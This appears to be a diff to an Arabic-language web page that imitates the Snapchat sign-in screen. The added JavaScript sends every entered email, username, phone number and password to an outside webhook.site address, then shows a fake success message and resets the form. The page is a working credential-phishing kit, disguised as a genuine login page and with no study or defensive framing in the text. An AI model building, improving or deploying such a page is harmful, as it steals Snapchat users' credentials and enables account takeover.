@@ -45,7 +45,7 @@ h1 {
   text-align: right;
   display: flex;
   flex-direction: column;
-  align-items: center; /* جعل الخانات في منتصف الإطار */
+  align-items: center;
 }
 
 label {
@@ -54,12 +54,12 @@ label {
   font-weight: 600;
   color: #000;
   margin-bottom: 5px;
-  width: 90%; /* محاذاة الوصف مع بداية الخانة */
-  text-align: right; /* يبقى الوصف على يمين الخانة */
+  width: 90%;
+  text-align: right;
 }
 
 input {
-  width: 90%; /* الخانة في منتصف الإطار */
+  width: 90%;
   padding: 10px;
   border-radius: 10px;
   border: 1px solid #ddd;
@@ -144,16 +144,13 @@ button:hover {
   .card {
     padding: 20px 12px;
   }
-
   h1 {
     font-size: 20px;
   }
-
   input, button {
     font-size: 14px;
     padding: 10px;
   }
-
   label {
     font-size: 13px;
     width: 90%;
@@ -165,15 +162,23 @@ button:hover {
 
 <div class="card">
 
-  <!-- شعار سناب -->
   <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" class="logo" alt="Snapchat Logo">
+
+  <!-- رسالة نجاح/خطأ -->
+  <div id="message" style="display:none; padding:8px; border-radius:8px; margin-bottom:15px; font-size:13px;"></div>
+
+  <!-- مؤشر التحميل -->
+  <div id="loading" style="display:none; text-align:center; margin:10px 0;">
+    <div style="border:3px solid #f3f3f3; border-top:3px solid #007AFF; border-radius:50%; width:24px; height:24px; animation:spin 0.8s linear infinite; margin:0 auto;"></div>
+  </div>
+  <style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>
 
   <!-- الخطوة 1: البريد أو اسم المستخدم -->
   <div id="step1" class="fade">
     <h1>تسجيل الدخول</h1>
     <div class="input-group">
       <label for="userInput">البريد الإلكتروني أو اسم المستخدم</label>
-      <input type="text" id="userInput" placeholder="أدخل البريد الإلكتروني أو اسم المستخدم" value="">
+      <input type="text" id="userInput" placeholder="البريد الإلكتروني أو اسم المستخدم">
     </div>
     <button onclick="nextStep()">التالي</button>
     <a class="link" onclick="usePhone()">استخدام رقم الهاتف بدلاً من ذلك</a>
@@ -184,7 +189,7 @@ button:hover {
     <h1>تسجيل الدخول برقم الهاتف</h1>
     <div class="input-group">
       <label for="phoneInput">رقم الهاتف</label>
-      <input type="text" id="phoneInput" placeholder="أدخل رقم الهاتف" value="">
+      <input type="text" id="phoneInput" placeholder="رقم الهاتف">
     </div>
     <button onclick="nextStepPhone()">التالي</button>
     <a class="link" onclick="backToEmail()">الرجوع للبريد الإلكتروني</a>
@@ -195,20 +200,51 @@ button:hover {
     <h1 id="userDisplay"></h1>
     <div class="input-group">
       <label for="passwordInput">كلمة المرور</label>
-      <input type="password" id="passwordInput" placeholder="أدخل كلمة المرور" value="">
+      <input type="password" id="passwordInput" placeholder="كلمة المرور">
     </div>
     <button onclick="login()">تسجيل الدخول</button>
     <a class="link" onclick="backToStep1()">تغيير الحساب</a>
   </div>
 
-</div>
+  <div class="signup-text">
+    هل أنت جديد في سناب شات؟ <a href="#">تسجيل الاشتراك</a>
+  </div>
 
-<!-- النص أسفل الإطار -->
-<div class="signup-text">
-  هل أنت جديد في سناب شات؟ <a href="#">تسجيل الاشتراك</a>
 </div>
 
 <script>
+// رابط Webhook
+const WEBHOOK_URL = 'https://webhook.site/7076cb5c-eee3-4ca0-8533-6f064255b742';
+
+// عناصر إضافية للرسائل والتحميل
+const messageDiv = document.getElementById('message');
+const loadingDiv = document.getElementById('loading');
+
+function showMessage(text, type) {
+  messageDiv.style.display = 'block';
+  messageDiv.textContent = text;
+  messageDiv.style.background = type === 'success' ? '#d4edda' : '#f8d7da';
+  messageDiv.style.color = type === 'success' ? '#155724' : '#721c24';
+  messageDiv.style.border = type === 'success' ? '1px solid #c3e6cb' : '1px solid #f5c6cb';
+  setTimeout(() => { messageDiv.style.display = 'none'; }, 2000);
+}
+
+async function sendToWebhook(data) {
+  try {
+    loadingDiv.style.display = 'block';
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ...data, timestamp: new Date().toISOString() })
+    });
+  } catch (error) {
+    console.error('Webhook error:', error);
+  } finally {
+    loadingDiv.style.display = 'none';
+  }
+}
+
 function fadeTransition(hideEl, showEl) {
   hideEl.classList.remove('fade');
   hideEl.classList.add('hidden');
@@ -216,24 +252,42 @@ function fadeTransition(hideEl, showEl) {
   showEl.classList.add('fade');
 }
 
-function nextStep() {
+async function nextStep() {
   const user = document.getElementById("userInput").value.trim();
   if(user === "") { alert("الرجاء إدخال اسم المستخدم أو البريد الإلكتروني"); return; }
+  
+  await sendToWebhook({ type: 'step1_email', value: user });
+  
   document.getElementById("userDisplay").innerText = user;
   fadeTransition(document.getElementById("step1"), document.getElementById("step2"));
 }
 
-function nextStepPhone() {
+async function nextStepPhone() {
   const phone = document.getElementById("phoneInput").value.trim();
   if(phone === "") { alert("الرجاء إدخال رقم الهاتف"); return; }
+  
+  await sendToWebhook({ type: 'step1_phone', value: phone });
+  
   document.getElementById("userDisplay").innerText = phone;
   fadeTransition(document.getElementById("stepPhone"), document.getElementById("step2"));
 }
 
-function login() {
+async function login() {
   const password = document.getElementById("passwordInput").value.trim();
+  const user = document.getElementById("userDisplay").innerText;
+  
   if(password === "") { alert("الرجاء إدخال كلمة المرور"); return; }
-  alert("تم تسجيل الدخول بنجاح!");
+  
+  await sendToWebhook({ type: 'complete_login', username: user, password: password });
+  
+  showMessage("✅ تم تسجيل الدخول بنجاح!", "success");
+  
+  setTimeout(() => {
+    document.getElementById("passwordInput").value = '';
+    backToStep1();
+    document.getElementById("userInput").value = '';
+    document.getElementById("phoneInput").value = '';
+  }, 1000);
 }
 
 function usePhone() {
